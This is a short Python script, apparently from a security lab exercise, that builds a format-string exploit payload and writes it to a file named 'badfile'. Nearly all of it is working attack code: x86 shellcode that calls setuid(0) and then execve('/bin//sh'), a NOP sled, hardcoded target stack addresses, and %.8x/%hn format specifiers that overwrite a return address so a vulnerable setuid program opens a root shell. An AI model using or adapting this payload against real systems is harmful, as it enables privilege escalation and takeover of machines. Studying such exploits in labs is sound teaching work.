#!/usr/bin/python3

import sys

shellcode = (
    "\x31\xc0"      # xorl %eax, %eax
    "\x31\xdb"      
    "\xb0\xd5"      
    "\xcd\x80"      # int $0x80
    "\x31\xc0"      # xorl %eax, %eax
    "\x50"          # pushl %eax
    "\x68""//sh"    # pushl $0x68732f2f
    "\x68""/bin"    # pushl $0x6e69622f
    "\x89\xe3"      # movl %esp, %ebx
    "\x50"          # pushl %eax
    "\x53"          # pushl %ebx
    "\x89\xe1"      # movl %esp, %ecx
    "\x99"          # cdq
    "\xb0\x0b"      # movb $0x0b, %al
    "\xcd\x80"      # int $0x80
    "\x00"
).encode('latin-1')

N = 200

# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Put the shellcode at the beginning
start = N - len(shellcode)
content[start:] = shellcode

# Put the address at the beginning
#addr1 = 0xbfffecbc
#addr2 = 0xbfffecbe
addr1 = 0xffffd10e
addr2 = 0xffffd10c
content[0:4] = (addr2).to_bytes(4,byteorder='little')
content[4:8] = ("@@@@").encode('latin-1')
content[8:12] = (addr1).to_bytes(4,byteorder='little')

###################################################
# Add the format specifiers
# 1. Investigation
# s = "%.8x:"*40 + "\n"

# 2. 
C = 15 
small = 0xd194 - 12 - 8*C
large = 0xffff - 0xd194
s = "%.8x"*C + "%." + str(small) + "x" + "%hn" \
             + "%." + str(large) + "x" + "%hn" 
fmt = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
